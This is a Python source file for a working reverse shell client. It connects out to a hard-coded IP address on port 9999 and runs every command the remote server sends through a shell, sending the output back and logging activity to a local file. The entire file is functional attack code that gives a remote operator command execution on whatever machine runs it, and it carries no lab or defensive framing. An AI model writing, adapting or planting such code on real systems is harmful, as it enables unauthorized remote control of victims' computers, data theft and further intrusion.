import socket
import os
import subprocess
import datetime
import json

# Load configuration from config.json
def load_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
            log_message("Configuration loaded from config.json")
            return config
    except FileNotFoundError:
        log_message("config.json not found, using default values", "WARNING")
        return None
    except json.JSONDecodeError as e:
        log_message(f"Invalid JSON in config file: {e}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Error loading config: {e}", "ERROR")
        return None

# Simple logging function
def log_message(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    # Write to log file
    try:
        with open("client.log", "a") as log_file:
            log_file.write(log_entry)
    except:
        pass  # Silently fail if can't write logs

# Connect to server
def connect_to_server(host, port):
    try:
        s = socket.socket()
        log_message(f"Attempting to connect to {host}:{port}")
        s.connect((host, port))
        log_message(f"Connected successfully to {host}:{port}")
        return s
    except socket.error as e:
        log_message(f"Connection failed: {str(e)}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Unexpected error during connection: {str(e)}", "ERROR")
        return None

# Execute commands received from server
def execute_commands(s):
    try:
        while True:
            try:
                # Receive data from server
                data = s.recv(1024)
                
                if not data:
                    log_message("No data received, connection may be closed", "WARNING")
                    break
                
                # Handle directory change command
                if data[:2].decode("utf-8") == 'cd':
                    try:
                        os.chdir(data[3:].decode("utf-8"))
                        log_message(f"Changed directory to: {os.getcwd()}")
                    except Exception as e:
                        log_message(f"Failed to change directory: {str(e)}", "ERROR")
                        error_msg = f"Error: {str(e)}\n"
                        s.send(str.encode(error_msg + os.getcwd() + "> "))
                        continue
                
                # Execute command
                if len(data) > 0:
                    try:
                        cmd_str = data[:].decode("utf-8")
                        log_message(f"Executing command: {cmd_str}")
                        
                        cmd = subprocess.Popen(
                            cmd_str, 
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        currentWD = os.getcwd() + "> "
                        
                        # Send response back to server
                        s.send(str.encode(output_str + currentWD))
                        log_message(f"Command executed successfully")
                        
                    except Exception as e:
                        log_message(f"Error executing command: {str(e)}", "ERROR")
                        error_msg = f"Error executing command: {str(e)}\n"
                        try:
                            s.send(str.encode(error_msg + os.getcwd() + "> "))
                        except:
                            log_message("Failed to send error message to server", "ERROR")
                            break
                            
            except socket.error as e:
                log_message(f"Socket error in command loop: {str(e)}", "ERROR")
                break
            except Exception as e:
                log_message(f"Unexpected error in command loop: {str(e)}", "ERROR")
                break
                
    except KeyboardInterrupt:
        log_message("Client interrupted by user", "WARNING")
    except Exception as e:
        log_message(f"Error in execute_commands: {str(e)}", "ERROR")
    finally:
        try:
            s.close()
            log_message("Connection closed")
        except:
            pass

def main():
    # Configuration
    host = "172.25.217.136"  # Change this to your server IP
    port = 9999
    
    log_message("=" * 50)
    log_message("Reverse Shell Client Starting...")
    log_message("=" * 50)
    
    # Connect to server
    s = connect_to_server(host, port)
    
    if s is None:
        log_message("Failed to connect to server. Exiting...", "ERROR")
        return
    
    # Execute commands
    execute_commands(s)
    
    log_message("Client shutting down...")

if __name__ == "__main__":
    main()
